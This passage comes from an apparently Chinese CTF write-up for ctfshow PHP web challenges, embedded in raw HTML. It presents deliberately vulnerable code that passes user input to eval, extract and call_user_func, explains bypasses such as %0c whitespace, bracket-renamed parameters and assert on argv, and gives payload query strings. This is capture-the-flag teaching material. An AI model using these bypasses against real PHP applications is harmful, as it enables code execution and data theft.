class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"0x\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$num</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"0\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$num</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$num</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"e\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token variable\">$num</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"+\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$num</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token variable\">$num</span><span class=\"token operator\">!==</span><span class=\"token string single-quoted-string\">'36'</span> <span class=\"token keyword\">and</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token string single-quoted-string\">'36'</span> <span class=\"token keyword\">and</span> <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'36'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'36'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hacker!!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hacker!!!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>本题主要考察绕过 is_numeric，!== 不全等，数值或者类型不相同</p>\n<p>在数字的前面加上 %09 %0a %0b %0c %0d 任意一个都可以使其为真不影响判断。</p>\n<p>对于 trim 函数首位去空，可以去除空格以及 <code>\\n\\r\\t\\v\\0</code> ，但不会过滤 <code>\\f</code> ，于是本题可以使用 %0c 绕过</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230214225308922.png\" alt=\"image-20230214225308922\" /></p>\n<h2 id=\"web123\"><a class=\"anchor\" href=\"#web123\">#</a> web123</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'argv'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'fun'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'CTF_SHOW'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'CTF_SHOW.COM'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'fl0g'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\\"|\\'|\\,|\\.|\\;|\\?/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$c</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>         <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$c</span></span>\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\";\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>         <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fl0g</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"flag_give_me\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>             <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>         <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>本题没啥限制，直接上 payload：</p>\n<pre><code>?CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo%20$flag\n</code></pre>\n<p>这里不用 CTF_SHOW.COM 的原因是因为这里又一个点，变量名重只能有数字字母下划线，所以我们构造不出来原参数，被 get 或者 post 传入的变量名，如果含有空格、+、[则会被转化为_，php 中有个特性就是如果传入 [，它被转化为_之后，后面的字符就会被保留下来不会被替换，所以这里要使用 [</p>\n<h2 id=\"web125\"><a class=\"anchor\" href=\"#web125\">#</a> web125</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'argv'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'fun'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'CTF_SHOW'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'CTF_SHOW.COM'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'fl0g'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$c</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>         <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$c</span></span>\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\";\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>         <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fl0g</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"flag_give_me\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>             <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>         <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>比起上一题多了一些过滤，如 echo，flag 等等，构造命令执行发现没反应，大概是 ban 掉了，但是高亮函数应该没禁用，毕竟本题还使用了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230214231811542.png\" alt=\"image-20230214231811542\" /></p>\n<h2 id=\"web126\"><a class=\"anchor\" href=\"#web126\">#</a> web126</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'argv'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'fun'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'CTF_SHOW'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'CTF_SHOW.COM'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'fl0g'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>         <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$c</span></span>\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\";\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>         <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fl0g</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"flag_give_me\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>             <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>         <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>本题过滤名单加上了几个字母 g|i|f|c|o|d，那么上面一题的高亮用法也被过滤了，那么 get 和 post 就不能再使用了，而且这里存在长度限制。最后还有的办法就是利用原有的 echo 语句输出 flag</p>\n<p>parse_str () 函数把查询字符串解析到变量中</p>\n<p>assert () 判断一个表达式是否成立，之间的代码会被执行</p>\n<p>看到 $a=$_SERVER ['argv'];，这里可以利用，“$argv” 用于存放指向字符串的参数，是传递给脚本的参数数组，每一个元素指向一个参数，第一个参数总是当前脚本的文件名；</p>\n<p>这里测试一下，注意这里需要将 register_argc_argv 配置项改为为 no，</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215135512053.png\" alt=\"image-20230215135512053\" /></p>\n<p>cli 模式下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215162645586.png\" alt=\"image-20230215162645586\" /></p>\n<p>网页模式下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215162736593.png\" alt=\"image-20230215162736593\" /></p>\n<p>本题的逻辑就显而易见了，前面的 CTF_SHOWW 不变，fun=assert ($a [0])，这样就会执行 $a [0] 的参，get 传入一个？$fl0g=flag_give_me，就会将这一句话通过断言执行，成功将 $fl0g 赋值，通过原有的 echo 语句输出 flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215164257976.png\" alt=\"image-20230215164257976\" /></p>\n<h2 id=\"web127\"><a class=\"anchor\" href=\"#web127\">#</a> web127</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$ctf_show</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$url</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'QUERY_STRING'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 特殊字符检测</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\'|\\\"|\\&lt;|\\,|\\>|\\.|\\\\\\|\\//'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"嗯哼？\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctf_show</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'ilove36d'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>extract () 函数从数组中将变量导入到当前的符号表。</p>\n<p>没啥限制，直接变量覆盖，这里下划线被过滤，尝试 [[空格], 空格可以直接绕过</p>\n<p><img data-src=\"C:%5CUsers%5C%E9%99%8C%E8%B7%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230215165026747.png\" alt=\"image-20230215165026747\" /></p>\n<h2 id=\"web128\"><a class=\"anchor\" href=\"#web128\">#</a> web128</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$f1</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$f2</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f1</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$f2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"嗯哼？\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">check</span><span class=\"token punctuation\">(</span><span class=\"token 